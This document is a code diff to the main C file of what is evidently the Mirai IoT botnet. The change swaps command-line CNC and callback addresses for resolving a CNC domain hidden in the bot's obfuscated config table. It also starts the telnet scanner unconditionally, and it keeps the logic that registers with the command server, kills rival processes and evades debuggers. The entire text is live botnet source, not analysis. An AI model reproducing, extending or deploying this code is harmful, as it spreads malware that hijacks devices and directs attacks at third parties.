@@ -33,8 +33,6 @@ static BOOL unlock_tbl_if_nodebug(char *);
 
 struct sockaddr_in srv_addr;
 int fd_ctrl = -1, fd_serv = -1;
-char cncIpAddress[20];
-unsigned char enable_scanner = 0;
 BOOL pending_connection = FALSE;
 void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry
 
@@ -48,27 +46,6 @@ static void segv_handler(int sig, siginfo_t *si, void *unused)
 
 int main(int argc, char **args)
 {
-    if (argc == 5) {
-        util_strcpy(cncIpAddress, args[1]);
-        if (atoi(args[4]) == 1) {
-            enable_scanner = 1;
-        }
-#ifdef DEBUG
-        printf("[main] number of arguments: %d\n", argc);
-        printf("[main] cnc ip address (args[1]): %s\n", args[1]);
-        printf("[main] local ip address (args[2]): %s\n", args[2]);
-        printf("[main] callback ip address (args[3]): %s\n", args[3]);
-        printf("[main] enable scanner (args[4]): %s\n", args[4]);
-#endif
-    } else {
-#ifdef DEBUG
-        printf("[main] invalid number of arguments\n");
-        printf("[main] <cnc ip> <local ip> <callback ip> <enable scanner 0/1>\n");
-        printf("[main] quitting\n");
-        exit(-1);
-#endif
-    }
-
     char *tbl_exec_succ;
     char name_buf[32];
     char id_buf[32];
@@ -104,7 +81,7 @@ int main(int argc, char **args)
 #endif
 
 #ifdef DEBUG
-    printf("[main] DEBUG MODE YO\n");
+    printf("DEBUG MODE YO\n");
 
     sleep(1);
 
@@ -123,7 +100,7 @@ int main(int argc, char **args)
         perror("sigaction");
 #endif
 
-    LOCAL_ADDR = util_local_addr(args[2]);
+    LOCAL_ADDR = util_local_addr();
 
     srv_addr.sin_family = AF_INET;
     srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
@@ -180,12 +157,8 @@ int main(int argc, char **args)
     killer_init();
 //#ifndef DEBUG
 #ifdef MIRAI_TELNET
-#ifdef DEBUG
-    printf("[main] starting scanner\n");
-#endif
-    if (enable_scanner) {
-        scanner_init(args[2], args[3]);
-    }
+    printf("[scanner] init\n");
+    scanner_init();
 #endif
 //#endif
 
@@ -251,7 +224,7 @@ int main(int argc, char **args)
             scanner_kill();
 #endif
             killer_kill();
-            attack_kill_all(args[2], args[3], enable_scanner);
+            attack_kill_all();
             kill(pgid * -1, 9);
             exit(0);
         }
@@ -287,7 +260,7 @@ int main(int argc, char **args)
                 {
                     uint8_t id_len = util_strlen(id_buf);
 
-                    LOCAL_ADDR = util_local_addr(args[2]);
+                    LOCAL_ADDR = util_local_addr();
                     send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
                     send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
                     if (id_len > 0)
@@ -295,10 +268,7 @@ int main(int argc, char **args)
                         send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                     }
 #ifdef DEBUG
-                    int len=20;
-                    char buffer[len];
-                    inet_ntop(AF_INET, &(LOCAL_ADDR), buffer, len);
-                    printf("[main] Connected to CNC. Local address = %s\n", buffer);
+                    printf("[main] Connected to CNC. Local address = %d\n", LOCAL_ADDR);
 #endif
                 }
             }
@@ -388,19 +358,20 @@ static void anti_gdb_entry(int sig)
 
 static void resolve_cnc_addr(void)
 {
-//    table_unlock_val(TABLE_CNC_IP);
-//    char* ip = (char *)table_retrieve_val(TABLE_CNC_IP, NULL);
-//    srv_addr.sin_addr.s_addr = inet_addr(ip);
-//    table_lock_val(TABLE_CNC_IP);
+    struct resolv_entries *entries;
 
-    srv_addr.sin_addr.s_addr = util_local_addr(cncIpAddress);
-
+    table_unlock_val(TABLE_CNC_DOMAIN);
+    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
+    table_lock_val(TABLE_CNC_DOMAIN);
+    if (entries == NULL)
+    {
 #ifdef DEBUG
-    int len=20;
-    char buffer[len];
-    inet_ntop(AF_INET, &(srv_addr.sin_addr.s_addr), buffer, len);
-    printf("[main] CNC ip address: %s\n", buffer);
+        printf("[main] Failed to resolve CNC address\n");
 #endif
+        return;
+    }
+    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
+    resolv_entries_free(entries);
 
     table_unlock_val(TABLE_CNC_PORT);
     srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
